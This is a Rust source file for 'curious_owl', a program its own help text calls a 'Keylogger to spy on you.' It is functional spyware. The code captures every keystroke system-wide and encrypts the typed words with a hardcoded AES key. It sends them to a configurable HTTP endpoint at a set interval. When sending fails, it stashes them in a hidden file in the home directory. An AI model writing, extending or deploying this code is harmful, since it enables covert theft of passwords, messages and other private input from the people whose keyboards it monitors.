// MIT License
//
// Copyright (c) 2024 Max Wiklund
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

use std::env;
use std::fs;
use std::io;
use std::sync::{Arc, Mutex};

use rdev::{listen, EventType, Key as KeyBord};
use reqwest::Client;
use tokio::time::{sleep, Duration, Instant};

use aes_gcm;
use aes_gcm::aead::Aead;
use aes_gcm::aead::Key;
use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
use hex;
use rand::RngCore;

use clap::{Arg, Command};
use serde_json::json;

struct Options {
    endpoint: String,
    tmp_file: String,
    key: &'static [u8],
}

/// Setup cli.
fn cli() -> Command {
    Command::new("curious_owl")
        .about("Keylogger to spy on you.")
        .arg(
            Arg::new("end-point")
                .help("Endpoint to send keystrokes to.")
                .default_value("http://127.0.0.1:5000/endpoint"),
        )
        .arg(
            Arg::new("interval")
                .short('i')
                .help("interval in seconds to send data back.")
                .default_value("10")
                .value_parser(clap::value_parser!(u64)),
        )
}


#[tokio::main]
async fn main() {
    let command = cli();
    let matches = command.get_matches();

    let end_point = matches.get_one::<String>("end-point").unwrap();
    let response_intervals = matches.get_one::<u64>("interval").unwrap().clone();

    let secrets_fp = match get_file_path() {
        Ok(code) => code,
        Err(e) => {
            eprintln!("{e:#}");
            std::process::exit(1);
        }
    };

    let opt = Options {
        endpoint: end_point.to_string(),
        tmp_file: secrets_fp,
        key: b"anexampleverysecurekey1234567890", // Super secret key.
    };

    // Shared buffer to store keystrokes.
    let tex_document_buffer = Arc::new(Mutex::new(String::new()));
    let doc_clone = Arc::clone(&tex_document_buffer);

    // Spawn a task to send requests every 10 seconds
    tokio::spawn(async move {
        loop {
            match send_data(&opt, Arc::clone(&tex_document_buffer)).await {
                Err(e) => {
                    eprintln!("{e:#}");
                }
                _ => {}
            }
            sleep(Duration::from_secs(response_intervals)).await; // Wait for n seconds.
        }
    });

    // Main thread can continue with other work
    listen_for_keystrokes(doc_clone);
}

/// Get temp file with saved keystrokes when no connection found.
fn get_file_path() -> Result<String, String> {
    if cfg!(target_os = "windows") {
        if let Ok(home) = env::var("USERPROFILE") {
            return Ok(home + r"\.curious_owl_secrets.json");
        }
    } else if cfg!(target_os = "macos") || cfg!(target_os = "linux") {
        if let Ok(home) = env::var("HOME") {
            return Ok(home + "/.curious_owl_secrets.json");
        }
    }
    Err("Failed find file path to save secrets in".to_string())
}

fn encrypt_aead(message: &str, app_key: &[u8]) -> (Vec<u8>, Vec<u8>) {
    // Generate a random nonce (12 bytes)
    let mut nonce_bytes = [0u8; 12];
    rand::thread_rng().fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);

    // Initialize the AES-GCM cipher
    let key = aes_gcm::Key::<Aes256Gcm>::from_slice(app_key); // Explicitly associate the key type
    let cipher = Aes256Gcm::new(key);

    // Encrypt the message
    let ciphertext = cipher
        .encrypt(nonce, message.as_bytes())
        .expect("Encryption failed");

    (nonce_bytes.to_vec(), ciphertext)
}

fn decrypt_aead(nonce: &[u8], ciphertext: &[u8], app_key: &[u8]) -> String {
    let key = Key::<Aes256Gcm>::from_slice(app_key); // Explicitly associate the key type
    let cipher = Aes256Gcm::new(key);
    let nonce = Nonce::from_slice(nonce);

    // Decrypt the message
    let plaintext = cipher.decrypt(nonce, ciphertext)
        .expect("Decryption failed");

    String::from_utf8(plaintext).expect("Invalid UTF-8")
}

async fn send_data(opt: &Options, tex_document_buffer: Arc<Mutex<String>>) -> io::Result<()> {
    let mut content_buffer = String::new();

    // If the file exists then the app has not managed to send the content.
    let fp = &opt.tmp_file;
    if fs::metadata(fp).is_ok() {

        let json_str = fs::read_to_string(fp)?;
        let jdata: serde_json::Value = serde_json::from_str(&json_str)?;

        if jdata.get("message").is_some() && jdata.get("nonce").is_some(){
            let nonce =  hex::decode(jdata["nonce"].as_str().unwrap()).unwrap();
            let message =  hex::decode(jdata["message"].as_str().unwrap()).unwrap();

            content_buffer = decrypt_aead(
                &nonce,
                &message,
                &opt.key
            )
        }

    }
    {
        let mut doc = tex_document_buffer.lock().unwrap();
        if content_buffer.is_empty() && doc.is_empty() {
            return Ok(());
        }
        content_buffer.push_str(&format!(" {}", &doc));
        doc.clear();
    }

    let (nonce, ciphertext) = encrypt_aead(&content_buffer.clone(), &opt.key);

    let data = json!({
        "nonce": hex::encode(nonce),
        "message": hex::encode(ciphertext)
    });



    let client = Client::new();
    match client.post(&opt.endpoint).json(&data).send().await {
        Ok(_response) => {
            // If File exists remove it.
            if fs::metadata(fp).is_ok() {
                fs::remove_file(fp)?;
            }
        }
        Err(_e) => {
            // Failed to send data to server save the file on disk.
            println!("Failed to connect");

            fs::write(fp, serde_json::to_string(&data)?)?;
        }
    }
    Ok(())
}

/// Event loop to listen for keystrokes and store them.
fn listen_for_keystrokes(tex_document_buffer: Arc<Mutex<String>>) {
    let buffer = Arc::new(Mutex::new(String::new()));
    let buffer_clone = Arc::clone(&buffer);
    let mut start = Instant::now(); // Record the start time

    if let Err(error) = listen(move |event| {
        let end = Instant::now(); // Record the end time
        let duration = end.duration_since(start); // Calculate the duration
        if duration > Duration::from_secs(3) { // After 3 seconds assume the word is done.
            push_word(&buffer_clone, &tex_document_buffer);
            start = Instant::now();
        }

        match &event.event_type {
            EventType::KeyPress(key) => {
                start = Instant::now();

                match key {
                    KeyBord::Backspace => {
                        let mut buffer = buffer_clone.lock().unwrap();
                        // The user is hopefully fixing a typo. Remove the last char.

                        buffer.pop();
                    }
                    // Check for Return, Tab, or Space keys
                    KeyBord::Return | KeyBord::Tab | KeyBord::Space => {
                        push_word(&buffer_clone, &tex_document_buffer);
                    }
                    _ => {
                        if let Some(name) = event.name {
                            let mut buffer = buffer_clone.lock().unwrap();
                            buffer.push_str(&name);
                        }
                    }
                }
            }
            _ => {}
        }
    }) {
        println!("Error: {:?}", error);
    }
}

/// Store new word in document buffer.
fn push_word(buffer_clone: &Arc<Mutex<String>>, tex_document_buffer: &Arc<Mutex<String>>) {
    let mut buffer = buffer_clone.lock().unwrap();
    if buffer.is_empty() {
        return;
    }
    let mut doc = tex_document_buffer.lock().unwrap();
    doc.push_str(&format!(" {}", buffer));
    buffer.clear();
}
